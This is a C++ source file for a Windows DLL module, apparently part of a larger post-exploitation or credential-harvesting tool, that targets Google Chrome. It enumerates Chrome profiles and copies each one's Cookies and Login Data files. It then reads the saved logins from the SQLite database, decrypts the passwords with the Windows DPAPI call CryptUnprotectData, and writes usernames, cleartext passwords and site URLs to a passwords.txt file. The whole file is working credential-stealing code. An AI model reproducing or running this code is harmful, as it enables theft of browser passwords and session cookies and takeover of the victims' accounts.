// GoogleChromeModule.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "GoogleChromeModule.h"
#include <string>
#include <Windows.h>
#include <vector>
#include <fstream>
#include <wincrypt.h>

#pragma comment(lib, "Crypt32")

// This is an example of an exported variable
//GOOGLECHROMEMODULE_API int nGoogleChromeModule=0;

// This is an example of an exported function.
/*GOOGLECHROMEMODULE_API int fnGoogleChromeModule(void)
{
	return 42;
}*/

using namespace std;

static wstring chromeDirectory;
static wstring outDir;
static wstring output;
static FILE *passFile;

void logLine(wstring line)
{
	output += line + L"\n";
}

BOOL createPassFile(wstring fileName)
{
	string s(fileName.begin(), fileName.end());

	if (fopen_s(&passFile, s.c_str(), "w") == 0)
	{
		return 1;
	}

	return 0;
}

void writePassword(const char* username, const wstring pass, const char* site)
{	
	fwprintf(passFile, L"%hs %ls %hs\n", username, pass.c_str(), site);
}

BOOL directoryExists(wstring path)
{
	DWORD attrib = GetFileAttributes(path.c_str());
	return(attrib != INVALID_FILE_ATTRIBUTES && attrib & FILE_ATTRIBUTE_DIRECTORY);
}

vector<wstring> getChromeProfiles()
{
	vector<wstring> profiles;
	profiles.push_back(L"Default");

	wifstream localState((chromeDirectory + L"Local State").c_str());
	wstring line;

	while (getline(localState, line))
	{
		int start;
		if ((start = line.find(L"\"Profile ")) != wstring::npos)
		{
			int end = line.rfind(L"\"");

			wstring profile = line.substr(start+1, end - start-1);

			profiles.push_back(profile);
		}
	}

	return profiles;
}

void copyChromeFileForUser(wstring file, wstring username)
{
	CopyFile((chromeDirectory + username + L"\\" + file).c_str(), (outDir + username + L"\\" + file).c_str(), false);
	logLine(L"Copied " + file);
}

wstring decryptBlob(DATA_BLOB *encryptedBlob)
{
	//CryptUnprotectData does not allocate this for you
	DATA_BLOB *decryptedBlob = new DATA_BLOB;
	decryptedBlob->cbData = 0;
	decryptedBlob->pbData = 0;

	//Neither is used by chrome
	DATA_BLOB *b = NULL;
	CRYPTPROTECT_PROMPTSTRUCT *d = NULL;

	CryptUnprotectData(encryptedBlob, NULL, b, NULL, d, 0, decryptedBlob);
	
	string value(reinterpret_cast<char const*>(decryptedBlob->pbData), decryptedBlob->cbData);
	wstring wvalue(value.begin(), value.end());
	return wvalue;
}

void decryptPasswordsForProfile(wstring profile)
{
	wstring wLoginData = outDir + profile + L"\\Login Data";

	string loginData;
	loginData.assign(wLoginData.begin(), wLoginData.end());
	sqlite3 *db;
	sqlite3_open(loginData.c_str(), &db);

	const char* sql = "SELECT action_url, username_value, password_value FROM logins";

	sqlite3_stmt *a;
	const char *b;
	if (sqlite3_prepare_v2(db, sql, strlen(sql), &a, &b) == SQLITE_OK)
	{
		while (sqlite3_step(a) == SQLITE_ROW)
		{
			const char *actionURL = (const char *)sqlite3_column_text(a, 0);
			const char *username = (const char*) sqlite3_column_text(a, 1);
			DATA_BLOB *passBlob = new DATA_BLOB;
			passBlob->pbData = (BYTE*) sqlite3_column_blob(a, 2);
			passBlob->cbData = sqlite3_column_bytes(a, 2);
			if (strcmp(username, ""))
			{
				wchar_t *output = new wchar_t[MAX_PATH];
				wstring pass = decryptBlob(passBlob);
				wsprintf(output, L"Retrieved password: \"%hs\" \"%ls\" \"%hs\"", username, pass.c_str(), actionURL);
				writePassword(username, pass, actionURL);
				logLine((wstring)output);
			}
		}
	}
}

void handleUserProfile(wstring username)
{
	
	logLine(L"Handling profile " + username);

	_wmkdir((outDir + username).c_str());
	createPassFile(outDir + username + L"\\passwords.txt");

	//Copy cookies for logged in accounts
	copyChromeFileForUser(L"Cookies", username);

	//Copy encrypted login data
	copyChromeFileForUser(L"Login Data", username);

	decryptPasswordsForProfile(username);
}

wstring CGoogleChromeModule::runModule(bool isAdmin, wstring userHome, wstring outputPath)
{
	chromeDirectory = userHome.append(L"AppData\\Local\\Google\\Chrome\\User Data\\");
	logLine(L"Running Google Chrome Module");
	if (directoryExists(chromeDirectory))
	{
		logLine(L"Chrome installed");
		outDir = outputPath.append(L"Chrome\\");
		_wmkdir(outDir.c_str());		

		vector<wstring> profiles = getChromeProfiles();
		for each (wstring profile in profiles)
		{
			handleUserProfile(profile);
			logLine(L"");
		}
	}

	else
	{
		logLine(L"Chrome not installed");
	}

	return output;
}

// This is the constructor of a class that has been exported.
// see GoogleChromeModule.h for the class definition
CGoogleChromeModule::CGoogleChromeModule()
{
	return;
}
